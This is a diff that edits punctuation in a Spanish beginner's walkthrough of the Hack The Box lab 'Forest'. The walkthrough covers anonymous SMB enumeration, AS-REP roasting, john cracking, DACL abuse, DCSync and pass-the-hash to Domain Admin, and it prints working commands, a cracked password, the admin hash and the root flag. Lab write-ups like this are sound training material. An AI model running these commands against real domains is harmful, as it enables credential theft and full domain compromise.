@@ -204,7 +204,7 @@
       <span class="badge b4">ACTIVE DIRECTORY</span>
       <span class="badge b5">DCSYNC</span>
     </div>
-    <p class="pitch">Guía para principiantes de <b>Forest</b>, la <b>#3</b> de la serie y la <b>primera de Active Directory</b>. Cambia el paradigma respecto a <a href="cap.html">Cap</a> y <a href="knife.html">Knife</a>: aquí no hay web ni exploit de servicio — es un ataque de dominio completo. De la enumeración anónima a <b>Domain Admin</b>, razonando cada salto. Si es tu primera AD, es normal sentirse perdido al inicio: AD es otro mundo, y esta guía te lleva de la mano por él.</p>
+    <p class="pitch">Guía para principiantes de <b>Forest</b>, la <b>#3</b> de la serie y la <b>primera de Active Directory</b>. Cambia el paradigma respecto a <a href="cap.html">Cap</a> y <a href="knife.html">Knife</a>: aquí no hay web ni exploit de servicio: es un ataque de dominio completo. De la enumeración anónima a <b>Domain Admin</b>, razonando cada salto. Si es tu primera AD, es normal sentirse perdido al inicio: AD es otro mundo, y esta guía te lleva de la mano por él.</p>
 
     <div class="chain">
       <div class="lnk" style="--acc:var(--cyan)"><div class="n">01</div><div class="t"><b>RECON</b><br>DC · 23 puertos</div></div>
@@ -218,7 +218,7 @@
 </header>
 
 <div class="intro">
-  <b>Requisitos:</b> cuenta HTB (VIP para retiradas), Kali, y la VPN levantada (una a la vez — <span class="mono">sudo pkill openvpn</span> antes de reconectar, como en <a href="knife.html">Knife</a>).
+  <b>Requisitos:</b> cuenta HTB (VIP para retiradas), Kali, y la VPN levantada (una a la vez: <span class="mono">sudo pkill openvpn</span> antes de reconectar, como en <a href="knife.html">Knife</a>).
   <br><br>
   <b>Herramientas nuevas que usa esta máquina:</b> <span class="mono">netexec</span>, <span class="mono">impacket-GetNPUsers</span>, <span class="mono">john</span>, <span class="mono">evil-winrm</span>, <span class="mono">bloodhound-python</span> + <span class="mono">BloodHound CE</span>, <span class="mono">PowerView</span>, <span class="mono">impacket-secretsdump</span>. Todas vienen en Kali. En esta guía la IP objetivo es <span class="mono">10.129.62.145</span> y la IP del atacante (tun0) <span class="mono">10.10.14.57</span>; las tuyas serán distintas.
 </div>
@@ -231,7 +231,7 @@
 
     <div class="fcard cyan">
       <h4>▚ Dominio y Domain Controller</h4>
-      <p>Un <b>dominio</b> gestiona de forma centralizada muchos equipos y usuarios bajo un mismo paraguas (la cuenta corporativa con la que inicia sesión toda una empresa). El <b>Domain Controller (DC)</b> es el servidor que manda: guarda todas las cuentas, contraseñas, grupos y permisos, y autentica a todos. <b>Forest es un DC.</b> Comprometer un DC es comprometer el dominio entero — por eso es el objetivo más goloso.</p>
+      <p>Un <b>dominio</b> gestiona de forma centralizada muchos equipos y usuarios bajo un mismo paraguas (la cuenta corporativa con la que inicia sesión toda una empresa). El <b>Domain Controller (DC)</b> es el servidor que manda: guarda todas las cuentas, contraseñas, grupos y permisos, y autentica a todos. <b>Forest es un DC.</b> Comprometer un DC es comprometer el dominio entero, por eso es el objetivo más goloso.</p>
     </div>
 
     <h3 class="step">Barrido y detección</h3>
@@ -244,11 +244,11 @@
     <p class="f">A diferencia de Cap (3 puertos) y Knife (2), un DC devuelve <b>23</b>. Los <code class="ic">4966x/4967x</code> son RPC dinámico (ruido). Los que importan forman la huella de AD:</p>
     <div class="tblwrap"><table>
       <tr><th>Puerto</th><th>Servicio</th><th>Qué significa</th></tr>
-      <tr><td><code>88</code></td><td>Kerberos</td><td>⭐ La estrella. El sistema de autenticación de AD. Verlo = hay dominio Windows. La técnica de Forest lo ataca.</td></tr>
+      <tr><td><code>88</code></td><td>Kerberos</td><td>La estrella: El sistema de autenticación de AD. Verlo = hay dominio Windows. La técnica de Forest lo ataca.</td></tr>
       <tr><td><code>389 / 636</code></td><td>LDAP / LDAPS</td><td>La "guía telefónica" del dominio: usuarios, grupos, permisos. Clave para enumerar. Permite <em>anonymous bind</em>.</td></tr>
       <tr><td><code>445</code></td><td>SMB</td><td>Comparticiones Windows. Aquí acepta sesión nula (<code>guest</code>).</td></tr>
       <tr><td><code>53</code></td><td>DNS</td><td>El DC también es el DNS del dominio.</td></tr>
-      <tr><td><code>5985 / 47001</code></td><td>WinRM</td><td>⭐ Administración remota. Con credenciales, tu vía a una shell (el "SSH de Windows").</td></tr>
+      <tr><td><code>5985 / 47001</code></td><td>WinRM</td><td>Administración remota. Con credenciales, tu vía a una shell (el "SSH de Windows").</td></tr>
     </table></div>
     <p class="f">El <code class="ic">-sCV</code> revela el nombre del dominio, repetido por todas partes: <b>Domain: htb.local</b>, <code class="ic">FQDN: FOREST.htb.local</code>, Windows Server 2016. Y una perla en el script de SMB: <code class="ic">account_used: guest</code> → acepta acceso anónimo.</p>
 
@@ -268,7 +268,7 @@
 
     <div class="fcard amber">
       <h4>▚ SMB y por qué el acceso anónimo importa</h4>
-      <p><b>SMB</b> es el protocolo de Windows para compartir archivos y recursos en red. Cuando permite acceso <b>anónimo/guest</b>, puedes preguntarle cosas sin credenciales — entre ellas, a veces, <b>la lista de usuarios del dominio</b>. Y conseguir esa lista es el primer gran paso en AD: necesitas saber <em>a quién</em> atacar.</p>
+      <p><b>SMB</b> es el protocolo de Windows para compartir archivos y recursos en red. Cuando permite acceso <b>anónimo/guest</b>, puedes preguntarle cosas sin credenciales, entre ellas a veces <b>la lista de usuarios del dominio</b>. Y conseguir esa lista es el primer gran paso en AD: necesitas saber <em>a quién</em> atacar.</p>
     </div>
 
     <h3 class="step">Confirmar sesión nula y sacar usuarios</h3>
@@ -279,7 +279,7 @@
       <tr><th>Ruido (ignorar)</th><th>Grano (personas / cuentas reales)</th></tr>
       <tr><td><code>Administrator</code>, <code>Guest</code>, <code>krbtgt</code>, <code>DefaultAccount</code> (integradas) · <code>SM_*</code>, <code>HealthMailbox*</code>, <code>$*</code> (cuentas de Exchange, autogeneradas)</td><td><code>sebastien</code>, <code>lucinda</code>, <code>andy</code>, <code>mark</code>, <code>santi</code>, y <b><code>svc-alfresco</code></b></td></tr>
     </table></div>
-    <div class="why"><b>EL PREFIJO svc-</b><code class="ic">svc-alfresco</code> salta a la vista: <code class="ic">svc-</code> = <em>service account</em> (cuenta de servicio, no persona). Las cuentas de servicio suelen estar peor configuradas — contraseñas débiles y, a menudo, la debilidad de Kerberos que vamos a explotar.</div>
+    <div class="why"><b>EL PREFIJO svc-</b><code class="ic">svc-alfresco</code> salta a la vista: <code class="ic">svc-</code> = <em>service account</em> (cuenta de servicio, no persona). Las cuentas de servicio suelen estar peor configuradas: contraseñas débiles y, a menudo, la debilidad de Kerberos que vamos a explotar.</div>
 
     <p class="f">Guarda los usuarios-persona en un archivo (los necesitarás):</p>
     <pre><span class="k">echo</span> 'sebastien
@@ -305,13 +305,13 @@ svc-alfresco' &gt; users.txt</pre>
 
     <h3 class="step">Pedir los hashes</h3>
     <pre><span class="k">impacket-GetNPUsers</span> htb.local/ -no-pass -usersfile users.txt</pre>
-    <p class="f">Los cinco usuarios-persona responden <code class="ic">doesn't have UF_DONT_REQUIRE_PREAUTH set</code> (bien configurados). Pero <b>svc-alfresco</b> suelta el premio — un hash <code class="ic">$krb5asrep$...</code>. Guárdalo:</p>
+    <p class="f">Los cinco usuarios-persona responden <code class="ic">doesn't have UF_DONT_REQUIRE_PREAUTH set</code> (bien configurados). Pero <b>svc-alfresco</b> suelta el premio: un hash <code class="ic">$krb5asrep$...</code>. Guárdalo:</p>
     <pre><span class="k">impacket-GetNPUsers</span> htb.local/ -no-pass -usersfile users.txt | grep '\$krb5asrep\$' &gt; hash.txt</pre>
 
     <h3 class="step">Crackear offline</h3>
-    <p class="f">El hash es una representación cifrada de la contraseña. Se rompe <b>offline</b> (en tu Kali, sin tocar la víctima, intentos ilimitados) probando un diccionario. hashcat es lo estándar… pero en una VM sin GPU falla:</p>
-    <pre><span class="k">hashcat</span> -m 18200 hash.txt rockyou.txt   <span class="cmt"># ✗ No OpenCL/CUDA platform found (VM sin GPU)</span>
-<span class="k">john</span> --wordlist=/usr/share/wordlists/rockyou.txt hash.txt   <span class="cmt"># ✓ detecta el tipo solo</span></pre>
+    <p class="f">El hash es una representación cifrada de la contraseña. Se rompe <b>offline</b> (en tu Kali, sin tocar la víctima, intentos ilimitados) probando un diccionario. hashcat es lo estándar, pero en una VM sin GPU falla:</p>
+    <pre><span class="k">hashcat</span> -m 18200 hash.txt rockyou.txt   <span class="cmt"># falla: no OpenCL/CUDA (VM sin GPU)</span>
+<span class="k">john</span> --wordlist=/usr/share/wordlists/rockyou.txt hash.txt   <span class="cmt"># funciona: detecta el tipo solo</span></pre>
     <p class="f">John lo rompe en un segundo: <b><code class="ic">svc-alfresco : s3rvice</code></b>.</p>
     <div class="why"><b>hashcat vs john</b>hashcat brilla con GPU; en una VM sin GPU, <b>john</b> es tu herramienta de cracking (usa CPU sin quejarse y autodetecta el tipo de hash). Ten ambas en el arsenal.</div>
   </div>
@@ -371,7 +371,7 @@ svc-alfresco' &gt; users.txt</pre>
 
     <div class="fcard">
       <h4>▚ Los permisos que vamos a abusar</h4>
-      <p><b>GenericAll</b> = control total sobre un objeto (puedes, por ejemplo, agregarte a un grupo). <b>WriteDacl</b> = puedes modificar la lista de permisos (DACL) de un objeto — y así <em>concederte a ti mismo</em> nuevos derechos. <b>DCSync</b> = abusar de la replicación entre DCs para pedirle al DC todos los hashes de contraseñas del dominio, como si fueras otro DC.</p>
+      <p><b>GenericAll</b> = control total sobre un objeto (puedes, por ejemplo, agregarte a un grupo). <b>WriteDacl</b> = puedes modificar la lista de permisos (DACL) de un objeto, y así <em>concederte a ti mismo</em> nuevos derechos. <b>DCSync</b> = abusar de la replicación entre DCs para pedirle al DC todos los hashes de contraseñas del dominio, como si fueras otro DC.</p>
     </div>
 
     <h3 class="step">Preparar PowerView (vía evil-winrm)</h3>
@@ -394,14 +394,14 @@ $cred = New-Object System.Management.Automation.PSCredential('htb\svc-alfresco',
 
     <h3 class="step">Movimiento 3 · DCSync (desde Kali)</h3>
     <pre><span class="k">impacket-secretsdump</span> htb.local/svc-alfresco:s3rvice@10.129.62.145</pre>
-    <p class="f">El <code class="ic">rpc_s_access_denied</code> inicial es un método secundario — se ignora, porque debajo vuelca <b>todos los hashes del dominio</b>. La línea que importa (RID <code class="ic">500</code> = Administrator):</p>
+    <p class="f">El <code class="ic">rpc_s_access_denied</code> inicial es un método secundario: se ignora, porque debajo vuelca <b>todos los hashes del dominio</b>. La línea que importa (RID <code class="ic">500</code> = Administrator):</p>
     <pre>htb.local\Administrator:500:aad3b435...:<span class="o">32693b11e6aa90eb43d32c72a07ceea6</span>:::</pre>
 
     <h3 class="step">Pass-the-Hash · Domain Admin</h3>
     <p class="f">No hace falta crackear ese hash. En Windows te autenticas con el hash directamente (<b>Pass-the-Hash</b>): en vez de <code class="ic">-p contraseña</code>, usas <code class="ic">-H hash</code>.</p>
     <pre><span class="k">evil-winrm</span> -i 10.129.62.145 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
 <span class="k">type</span> C:\Users\Administrator\Desktop\root.txt   <span class="cmt"># -&gt; 650ace87ec9847f97c3deb4b998ef61a</span></pre>
-    <p class="f"><b>Eres Domain Admin. Forest comprometida por completo.</b> 🏴‍☠️</p>
+    <p class="f"><b>Eres Domain Admin. Forest comprometida por completo.</b></p>
   </div>
 </section>
 
